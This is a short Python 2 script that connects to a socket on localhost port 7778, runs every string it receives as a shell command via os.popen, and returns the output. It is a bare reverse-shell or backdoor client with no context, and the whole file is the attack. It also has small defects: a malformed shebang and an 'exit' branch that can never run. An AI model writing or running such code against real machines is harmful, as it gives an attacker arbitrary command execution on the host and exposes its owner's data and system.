#!usr/bin/env python
# coding:utf-8

import os
import time
import socket



client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('127.0.0.1',7778))

print client.recv(1024)
while True:
	a = client.recv(1024)
	if a:
		print ">>" + a
		shell = os.popen(a).read()
		if shell:
			client.send(shell)
	elif a == "exit":
		print 'exit'
		client.close()
		break
	else:
		time.sleep(1)
